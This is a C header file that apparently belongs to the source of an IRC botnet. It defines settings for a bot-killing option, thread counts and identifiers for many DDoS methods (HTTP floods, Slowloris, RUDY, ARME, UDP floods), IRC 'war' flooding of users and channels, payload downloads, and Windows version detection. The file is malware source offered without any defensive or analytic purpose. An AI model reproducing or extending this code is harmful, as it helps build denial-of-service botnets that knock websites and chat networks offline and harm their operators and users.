#include "settings.h"

#ifdef BOTKILL_ON_START
#define BOTKILL_PARENT_PROCESS
#endif

//DDoS Threading
#define THREADS_DDOS_HTTP_RAPID_GET     60
#define THREADS_DDOS_HTTP_RAPID_POST    60
#define THREADS_DDOS_HTTP_SLOW_POST     75
#define THREADS_DDOS_HTTP_SLOWLORIS     75
#define THREADS_DDOS_HTTP_RUDY          75
#define THREADS_DDOS_HTTP_ARME          60
#define THREADS_DDOS_HTTP_BANDWITH      100
#define THREADS_DDOS_HTTP_COMBO         60
#define THREADS_DDOS_LAYER4_UDP         1
#define THREADS_DDOS_LAYER4_ECF         1

//DDoS Constants
#define DDOS_HTTP_RAPID_GET             1
#define DDOS_HTTP_RAPID_POST            2
#define DDOS_HTTP_SLOW_POST             3
#define DDOS_HTTP_SLOWLORIS             4
#define DDOS_HTTP_RUDY                  5
#define DDOS_HTTP_ARME                  6
#define DDOS_LAYER4_UDP                 7
#define DDOS_LAYER4_ECF                 8
#define DDOS_HTTP_BANDWITH              9
#define DDOS_HTTP_COMBO                 10

//IRC Constants
#define DEFAULT                         1000
#define MAX_DDOS_BUFFER                 20000
#define MAX_IRC_SND_BUFFER              510
#define MAX_IRC_RCV_BUFFER              10000
#define IRC_SND_DELAY                   1750
#define MAX_IRC_CHANNEL_LEN             15

//Http related
#define HTTP_HEAD                       1
#define HTTP_GET_NORMAL                 2
#define HTTP_POST_NORMAL                3
#define HTTP_ARME                       4
#define HTTP_SLOWLORIS                  5
#define HTTP_RUDY                       6

//Max HTTP Packet Stuff
#define MAX_HTTP_PACKET_LENGTH          5000

//Irc War related
#define MAX_WAR_CONNECTIONS             50

//'smartview' definitions
#define SMARTVIEW_ADD_ENTRY             1
#define SMARTVIEW_DEL_ENTRY             2
#define SMARTVIEW_CLEAR_QUEUE           3

//War nickname types
//#define IRC_WAR_RANDOM                1
//#define IRC_WAR_ARYAN                 2
//#define IRC_WAR_INSOMNIA              3
//#define IRC_WAR_NGRBOT                4

//War flood types
#define WAR_KILL_USER                   1
#define WAR_KILL_USER_MULTI             2
#define WAR_FLOOD_CHANNEL               3
#define WAR_FLOOD_CHANNEL_HOP           4
#define WAR_FLOOD_ANOPE                 5

//Downloads
#define DOWNLOAD_MEMORY_SPACE           10000

//Operating Systems
#define WINDOWS_UNKNOWN                 1
#define WINDOWS_2000                    2
#define WINDOWS_XP                      3
#define WINDOWS_2003                    4
#define WINDOWS_VISTA                   5
#define WINDOWS_7                       6
#define WINDOWS_8                       7

//Registry Returns
//#define REGISTRY_SUCCESS                1
//#define ERR_QUERY_FAIL                  2
//#define ERR_ENTRY_NOT_FOUND             3
